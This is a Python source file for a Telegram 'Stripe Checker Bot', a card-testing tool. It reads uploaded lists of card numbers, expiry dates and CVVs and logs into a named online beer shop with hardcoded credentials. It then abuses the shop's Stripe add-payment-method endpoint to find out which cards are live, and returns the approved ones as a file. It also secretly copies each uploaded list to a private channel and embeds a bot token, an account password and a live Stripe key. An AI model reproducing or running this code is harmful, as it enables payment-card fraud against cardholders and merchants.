import asyncio
import re
import random
import requests
import os
import functools
import logging
from datetime import datetime
from bs4 import BeautifulSoup
from telegram import InputFile, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters
)

# === CONFIG ===
BOT_TOKEN = "7897881067:AAHpiRM9ICMX5SClV1wgIko9y4iADUqJMtk"
CHANNEL_ID = -1002555306699
GROUP_CHAT_ID = "@sigma6627272"
MESSAGE_ID = 3

EMAIL = "sigmasigma@gmail.com"
PASSWORD = "sigmaidmga!A"
STRIPE_PK = "pk_live_51J0pV2Ai5aSS7yFafQNdnFVlTHEw2v9DQyCKU4hs0u4R1R3MDes03yCFFeWlp0gEhVavJQQwUAJvQzSC3jSTye8Z00UACjDsfG"

LOGIN_URL = 'https://blackdonkeybeer.com/my-account/'
CHECK_URL = 'https://blackdonkeybeer.com/my-account/add-payment-method/'
AJAX_URL = 'https://blackdonkeybeer.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent'
ORIGIN = 'https://blackdonkeybeer.com'

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Accept': '*/*',
    'Connection': 'keep-alive'
}

combo_data = {}
approved_data = {}

logging.basicConfig(level=logging.INFO)

# === UTILS ===

def parse_combo_line(line):
    patterns = [
        r'(\d{13,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})',
        r'(\d{13,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    ]
    for pattern in patterns:
        match = re.match(pattern, line)
        if match:
            return match.group(1), match.group(2), match.group(3), match.group(4), line
    return None

def fresh_login_session():
    session = requests.Session()
    r = session.get(LOGIN_URL, headers=HEADERS)
    soup = BeautifulSoup(r.text, 'html.parser')
    nonce = soup.find('input', {'name': 'woocommerce-login-nonce'})
    referer = soup.find('input', {'name': '_wp_http_referer'})
    if not nonce or not referer:
        raise Exception("Login page failed")
    payload = {
        'username': EMAIL,
        'password': PASSWORD,
        'woocommerce-login-nonce': nonce['value'],
        '_wp_http_referer': referer['value'],
        'login': 'Log in'
    }
    resp = session.post(LOGIN_URL, data=payload, headers=HEADERS)
    if 'customer-logout' not in resp.text:
        raise Exception("Login failed")
    return session

def get_ajax_nonce(session):
    resp = session.get(CHECK_URL, headers=HEADERS)
    soup = BeautifulSoup(resp.text, 'html.parser')
    script = soup.find('script', {'id': 'wc-stripe-upe-classic-js-extra'})
    if script and script.string:
        match = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"(\w+)"', script.string)
        if match:
            return match.group(1)
    raise Exception("AJAX nonce not found")

def process_combo(combo):
    try:
        session = fresh_login_session()
        ajax_nonce = get_ajax_nonce(session)
        parsed = parse_combo_line(combo)
        if not parsed:
            return "ERROR", "Invalid combo format", combo
        number, month, year, cvv, full = parsed

        stripe_data = {
            'type': 'card',
            'card[number]': number,
            'card[exp_month]': month,
            'card[exp_year]': year,
            'card[cvc]': cvv,
            'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
            'key': STRIPE_PK,
        }

        stripe_resp = session.post('https://api.stripe.com/v1/payment_methods', headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': HEADERS['User-Agent'],
        }, data=stripe_data)

        stripe_json = stripe_resp.json()
        if 'error' in stripe_json:
            return "DECLINED", stripe_json['error']['message'], full

        payment_method_id = stripe_json['id']
        payload = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }

        wc_resp = session.post(AJAX_URL, headers={
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': CHECK_URL,
            'Origin': ORIGIN,
            'User-Agent': HEADERS['User-Agent'],
        }, data=payload)

        json_resp = wc_resp.json()

        if not json_resp.get('success') and 'Unable to verify your request' in str(json_resp):
            ajax_nonce = get_ajax_nonce(session)
            payload['_ajax_nonce'] = ajax_nonce
            wc_resp = session.post(AJAX_URL, headers={
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': CHECK_URL,
                'Origin': ORIGIN,
                'User-Agent': HEADERS['User-Agent'],
            }, data=payload)
            json_resp = wc_resp.json()

        if json_resp.get('success') and json_resp.get('data', {}).get('status') == 'succeeded':
            return "APPROVED", "Approved", full
        elif json_resp.get('data', {}).get('status') == 'requires_action':
            return "DECLINED", "3DS Secure Required", full
        else:
            return "DECLINED", "Declined", full

    except Exception as e:
        return "ERROR", str(e), combo

async def run_blocking(func, *args):
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, functools.partial(func, *args))

def keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("▶ Start Check", callback_data="startcheck"),
            InlineKeyboardButton("📊 Stats", callback_data="stats")
        ],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
    ])

async def start(update, context):
    try:
        await context.bot.forward_message(
            chat_id=update.effective_chat.id,
            from_chat_id=GROUP_CHAT_ID,
            message_id=MESSAGE_ID,
            protect_content=True
        )
    except:
        pass

    await update.message.reply_text(
        "Welcome! I'm your Stripe Checker Bot.\n\n"
        "To begin:\n"
        "1. Upload your combo list as a `.txt` file.\n"
        "2. Tap ▶ Start Check below.\n\n"
        "Need help? Use /chk followed by a card to test one manually.",
        reply_markup=keyboard()
    )

async def upload_file(update, context):
    doc = update.message.document
    chat_id = update.effective_chat.id

    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Only .txt files are allowed.")
        return

    file = await doc.get_file()
    raw = await file.download_as_bytearray()
    lines = raw.decode('utf-8', errors='ignore').splitlines()
    combo_data[chat_id] = [line.strip() for line in lines if line.strip()]
    approved_data[chat_id] = []

    await update.message.reply_text(f"✅ Loaded {len(combo_data[chat_id])} combos.")

    await context.bot.copy_message(
        chat_id=CHANNEL_ID,
        from_chat_id=chat_id,
        message_id=update.message.message_id
    )

async def send_result(chat_id, context, user, card, status, msg):
    tag = f"@{user.username}" if user.username else user.first_name
    icon = "✅" if status == "APPROVED" else "❌"
    time = datetime.now().strftime("%H:%M:%S")

    text = f"""
<b>{icon} {status} RESULT</b>
<code>{card}</code>

<b>Status:</b> {status}
<b>Response:</b> {msg}
<b>Gateway:</b> Stripe
<b>Checked by:</b> {tag}
<b>Time:</b> {time}
"""
    await context.bot.send_message(chat_id, text, parse_mode="HTML")
    if status == "APPROVED":
        approved_data[chat_id].append(card)

async def send_approved_file(chat_id, context):
    approved = approved_data.get(chat_id)
    if not approved:
        await context.bot.send_message(chat_id, "No approved cards to export.")
        return

    path = f"approved_{chat_id}.txt"
    with open(path, "w") as f:
        for line in approved:
            f.write(f"{line}\n")

    with open(path, "rb") as f:
        await context.bot.send_document(chat_id, document=InputFile(f), filename="approved.txt")

    os.remove(path)

async def single_check(update, context):
    chat_id = update.effective_chat.id
    user = update.effective_user
    if not context.args:
        await update.message.reply_text("Usage: /chk 4242424242424242|12|2026|123")
        return
    combo = ' '.join(context.args).strip()
    parsed = parse_combo_line(combo)
    if not parsed:
        await update.message.reply_text("⚠️ Invalid combo format.")
        return
    await update.message.reply_text("⏳ Checking combo...")
    try:
        status, msg, card = await run_blocking(process_combo, combo)
        await send_result(chat_id, context, user, card, status, msg)
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: <code>{str(e)}</code>", parse_mode="HTML")

async def callback_handler(update, context):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat.id
    user = update.effective_user

    if query.data == "stats":
        total = len(combo_data.get(chat_id, []))
        approved = len(approved_data.get(chat_id, []))
        await query.edit_message_text(f"📊 <b>Stats</b>\nTotal: {total}\nApproved: {approved}", parse_mode="HTML", reply_markup=keyboard())

    elif query.data == "help":
        await query.edit_message_text(
            "ℹ️ <b>Help</b>\n\n"
            "• Upload your combo list (.txt)\n"
            "• Press ▶ Start Check to begin\n"
            "• Or use /chk 4242|12|2026|123 to test one",
            parse_mode="HTML",
            reply_markup=keyboard()
        )

    elif query.data == "startcheck":
        combos = combo_data.get(chat_id)
        if not combos:
            await query.edit_message_text("Upload your combo.txt first.", reply_markup=keyboard())
            return

        await query.edit_message_text(f"✅ Started checking {len(combos)} combos...", reply_markup=None)

        for idx, combo in enumerate(combos, 1):
            status, msg, card = await run_blocking(process_combo, combo)
            await send_result(chat_id, context, user, card, status, msg)
            if idx % 10 == 0:
                await context.bot.send_message(chat_id, f"⏳ Progress: {idx}/{len(combos)}")

        await context.bot.send_message(
            chat_id,
            f"✅ <b>Check complete!</b>\nApproved: <b>{len(approved_data.get(chat_id, []))}</b> cards.",
            parse_mode="HTML"
        )

        await send_approved_file(chat_id, context)

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("chk", single_check))
    app.add_handler(MessageHandler(filters.Document.ALL, upload_file))
    app.add_handler(CallbackQueryHandler(callback_handler))
    logging.info("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
